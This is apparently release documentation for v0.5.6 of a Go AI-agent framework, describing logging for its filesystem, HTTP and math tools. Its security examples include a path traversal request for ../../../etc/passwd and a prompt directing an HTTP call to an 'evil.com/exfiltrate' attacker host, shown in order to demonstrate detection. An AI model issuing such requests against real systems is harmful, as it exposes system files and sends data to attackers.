# Built-in Tools Logging - v0.5.6

## Overview

Version 0.5.6 introduces comprehensive logging for all built-in tools (FileSystem, HTTP, Math), providing full observability of tool operations for security auditing, debugging, and production monitoring.

## Architecture

### Logger Injection via go:linkname

To avoid import cycles between `agent` and `agent/tools` packages, we use Go's `go:linkname` directive:

```go
// agent/builder.go
//go:linkname toolsSetLogFunc github.com/taipm/go-deep-agent/agent/tools.SetLogFunc
func toolsSetLogFunc(fn func(level, msg string, fields map[string]interface{}))
```

This allows Builder to inject logging callbacks into tools without creating circular dependencies.

### Logging Flow

1. **User enables logging**: `builder.WithDebugLogging()` or `WithInfoLogging()`
2. **Builder injects logger**: Calls `toolsSetLogFunc()` with a callback
3. **Tools log operations**: Use `logInfo()`, `logWarn()`, `logError()`, `logDebug()`
4. **Callback routes to agent.Logger**: Converts map fields to `[]agent.Field`

## Tool-Specific Logging

### FileSystemTool (Security Critical)

**Path Sanitization** (SECURITY):
- **WARN**: Path traversal attempts blocked (e.g., `../../../etc/passwd`)
- **DEBUG**: Path sanitization details (original → sanitized)

**File Operations**:
- **INFO**: Read, write, append operations with path and byte count
- **WARN**: Delete operations (destructive action)
- **ERROR**: Operation failures with error details

**Example Logs**:
```
[2025-01-15 10:30:45.123] WARN: Path traversal attempt blocked | tool=filesystem original_path=../../../etc/passwd sanitized_path=/Users/taipm/../../etc/passwd reason=contains '..'
[2025-01-15 10:30:46.456] INFO: File written successfully | tool=filesystem path=/tmp/demo.txt bytes=23
[2025-01-15 10:30:47.789] WARN: Deleting file | tool=filesystem path=/tmp/old.txt
```

### HTTPRequestTool (Observability Critical)

**Request Logging**:
- **INFO**: HTTP request start (method, URL, timeout, body presence)
- **DEBUG**: Custom headers set (header count)

**Response Logging** (dynamic log level):
- **ERROR**: HTTP 5xx responses
- **WARN**: HTTP 4xx responses OR slow requests (>5s)
- **INFO**: HTTP 2xx/3xx responses

**Logged Fields**:
- Method, URL, status code
- Duration (milliseconds)
- Response size (bytes)
- Content-Type header

**Example Logs**:
```
[2025-01-15 10:31:00.123] INFO: Making HTTP request | tool=http_request method=GET url=https://api.example.com/data timeout_secs=30 has_body=false
[2025-01-15 10:31:01.456] INFO: HTTP request completed successfully | tool=http_request method=GET url=https://api.example.com/data status=200 duration_ms=1333 response_size=2048 content_type=application/json
[2025-01-15 10:31:05.789] WARN: HTTP request completed with warning | tool=http_request method=GET url=https://slow-api.com/data status=200 duration_ms=6500 response_size=1024 content_type=text/html
```

### MathTool (Debugging Aid)

**Expression Evaluation**:
- **DEBUG**: Expression being evaluated and result
- **WARN**: Empty expressions
- **ERROR**: Invalid syntax or evaluation failures

**Example Logs**:
```
[2025-01-15 10:32:00.123] DEBUG: Evaluating math expression | tool=math operation=evaluate expression=sqrt(16) + pow(2, 3)
[2025-01-15 10:32:00.124] DEBUG: Math expression evaluated successfully | tool=math operation=evaluate expression=sqrt(16) + pow(2, 3) result=12.000000
[2025-01-15 10:32:01.456] ERROR: Invalid math expression | tool=math operation=evaluate expression=2 * ( 3 + error=unexpected token '+'
```

## Usage Examples

### Enable Debug Logging (All Tool Operations)

```go
ai := agent.NewOllama("qwen2.5:7b").
    WithDebugLogging(). // Shows ALL tool operations
    WithTool(tools.NewFileSystemTool()).
    WithTool(tools.NewHTTPRequestTool()).
    WithTool(tools.NewMathTool()).
    WithAutoExecute(true)
```

### Enable Info Logging (Production Recommended)

```go
ai := agent.NewOpenAI("gpt-4o", apiKey).
    WithInfoLogging(). // Shows important operations only
    WithTool(tools.NewFileSystemTool()).
    WithTool(tools.NewHTTPRequestTool())
```

### Custom Logger Integration

```go
// Use your own logger (e.g., zap, logrus)
customLogger := &MyCustomLogger{...}

ai := agent.NewOllama("qwen2.5:7b").
    WithLogger(customLogger). // Tools will automatically use this
    WithTool(tools.NewFileSystemTool())
```

## Security Benefits

### Path Traversal Detection

FileSystemTool logs ALL path traversal attempts:

```go
ai.Ask(ctx, "Read file at ../../../etc/passwd")
// Logs: WARN: Path traversal attempt blocked | original_path=../../../etc/passwd
```

This allows security teams to:
- Detect malicious prompts in production
- Audit file access patterns
- Implement alerting on suspicious activity

### External API Call Tracking

HTTPRequestTool logs ALL outbound HTTP requests:

```go
ai.Ask(ctx, "Get data from https://evil.com/exfiltrate")
// Logs: INFO: Making HTTP request | url=https://evil.com/exfiltrate
```

This enables:
- Data exfiltration detection
- Rate limiting enforcement
- Compliance auditing (GDPR, SOC2)

## Performance Impact

- **With NoopLogger (default)**: Zero overhead (no-op function calls optimized away)
- **With StdLogger (debug)**: ~10-50μs per log call
- **With Custom Logger**: Depends on implementation

Logging is designed to be production-safe with minimal performance impact.

## Migration Guide

### From v0.5.5 to v0.5.6

**No Breaking Changes** - Logging is opt-in:

```go
// v0.5.5 - No logging
ai := agent.NewOllama("qwen2.5:7b").
    WithTool(tools.NewFileSystemTool())

// v0.5.6 - Same code works, now with optional logging
ai := agent.NewOllama("qwen2.5:7b").
    WithDebugLogging(). // NEW: Enable logging
    WithTool(tools.NewFileSystemTool())
```

**Backward Compatibility**: All existing code continues to work without modification.

## Implementation Details

### Technical Challenges Solved

1. **Import Cycle Problem**: `agent` ↔ `agent/tools` circular dependency
   - **Solution**: `go:linkname` directive to link functions at link-time

2. **Type Mismatch**: `agent.Field` vs `map[string]interface{}`
   - **Solution**: Callback converts map → []Field in agent package

3. **Context Unavailable**: Tools don't receive `context.Context`
   - **Solution**: Use `context.Background()` for logging calls

### Code Structure

```
agent/
├── logger.go           # Logger interface, StdLogger, SlogAdapter
├── builder.go          # Logger injection via go:linkname
└── tools/
    ├── logger.go       # LogFunc callback, logDebug/Info/Warn/Error
    ├── filesystem.go   # FileSystem logging implementation
    ├── http.go         # HTTP logging implementation
    └── math.go         # Math logging implementation
```

## Testing

Run the logging demo example:

```bash
cd examples
go run tools_logging_demo.go
```

This demonstrates:
- FileSystem operations logging
- HTTP request logging  
- Math expression logging
- Security logging (path traversal block)

## Next Steps (Future Versions)

Potential logging enhancements for v0.6.x:

1. **Batch Operations Logging** (PRIORITY 2)
   - Batch progress tracking
   - Individual item completion
   - Error aggregation

2. **Embedding/Vector DB Logging** (PRIORITY 2)
   - Embedding generation metrics
   - Vector search performance
   - Cache hit rates

3. **Multimodal Logging** (PRIORITY 3)
   - Image processing operations
   - Vision model calls
   - Content moderation checks

4. **Structured Logging Enhancements**
   - Trace IDs for request correlation
   - Sampling for high-volume operations
   - Log level filtering per tool

## References

- Issue: Logging system audit
- Version: 0.5.6
- Architecture: Callback-based injection via `go:linkname`
- Coverage: 100% for FileSystem, HTTP, Math tools
